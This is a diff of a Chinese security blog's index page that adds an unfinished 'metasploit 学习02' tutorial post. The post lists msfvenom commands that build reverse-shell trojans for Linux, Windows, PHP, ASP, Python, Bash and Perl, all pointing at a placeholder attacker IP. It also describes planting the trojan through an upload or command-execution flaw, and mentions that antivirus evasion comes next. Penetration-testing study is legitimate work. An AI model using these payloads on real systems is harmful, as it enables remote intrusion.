@@ -227,6 +227,119 @@
             
 
   
+    <article id="post-metasploit-学习02" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+  
+  
+    <h1 itemprop="name">
+	
+	  <a class="article-title" href="/2021/06/13/metasploit-%E5%AD%A6%E4%B9%A002/">metasploit 学习02</a>
+	
+    </h1>
+  
+
+
+  
+  
+<a href="/2021/06/13/metasploit-%E5%AD%A6%E4%B9%A002/" class="archive-article-date">
+        <time datetime="2021-06-12T16:46:53.158Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-13</time>
+</a>
+
+  
+  
+    
+
+  
+  </header>
+  
+  <div class="article-entry" itemprop="articleBody">
+    
+    <h2 id="metasploit-学习02"><a href="#metasploit-学习02" class="headerlink" title="metasploit 学习02"></a>metasploit 学习02</h2><p><strong>简介：</strong>本地环境存在诸多限制，比如要发送payloaad反弹shell就需要一个公网ip。因此我选择将nsf搭建在vps上，具体教程请<a target="_blank" rel="noopener" href="https://www.linuxidc.com/Linux/2019-01/156378.htm">参考</a>：</p>
+<p><strong>内容：</strong></p>
+<p>利用msfvenom生成木马并且反弹shell。</p>
+<p>首先介绍下msfvenon的基本用法：</p>
+<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210612232318514.png" alt="image-20210612232318514"></p>
+<p>列举出常用的生成shell的命令：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">linux：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">windows：</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; <span class="built_in">echo</span> <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">Bash：</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl：</span><br><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>
+
+<p>木马生成后只要想办法放到目标机器下，根据目标机器的具体情况选择合适的方式下载并执行你的木马即可，然后就可以在攻击机上获取到反弹回来的shell了：</p>
+<p><strong>实例</strong></p>
+<p>首先生成木马</p>
+<p><img src="https://raw.githubusercontent.com/John-tlh/blog/master/imagesimage-20210612234307638.png" alt="image-20210612234307638"></p>
+<p>然后在靶机上找到一个上传漏洞或者命令执行漏洞，下载或者上传我们生成的木马到靶机，这里我以命令执行为例：</p>
+<p>上传后木马一直被杀软杀掉，考虑用免杀马，未完……</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/106348527">https://blog.csdn.net/qq_36119192/article/details/106348527</a></p>
+    
+    <a class="article-more-a" href="/2021/06/13/metasploit-%E5%AD%A6%E4%B9%A002/#more">more >></a>
+    
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">metasploit</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+	<div class="article-category tagcloud">
+		<i class="icon-book icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="/categories/渗透测试//" class="article-tag-list-link color5">渗透测试</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2021/06/13/metasploit-%E5%AD%A6%E4%B9%A002/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-从命令执行到内网渗透" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -1060,62 +1173,6 @@
 
 
   
-    <article id="post-todo" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-  <div class="article-entry" itemprop="articleBody">
-    
-    <p>cli</p>
-<p>缓冲区溢出</p>
-<p>apt</p>
-<p>病毒与木马</p>
-<p>彩虹表hash破解</p>
-<p>域渗透</p>
-
-    
-
-    
-
-    
-
-  </div>
-  <div class="article-info article-info-index">
-    
-    
-    
-
-    
-    <p class="article-more-link">
-      <a class="article-more-a" href="/2021/02/28/todo/">展开全文 >></a>
-    </p>
-    
-
-    
-    <div class="clearfix"></div>
-  </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
@@ -1342,6 +1399,10 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">metasploit</a>
               </li>
             
             <div class="clearfix"></div>
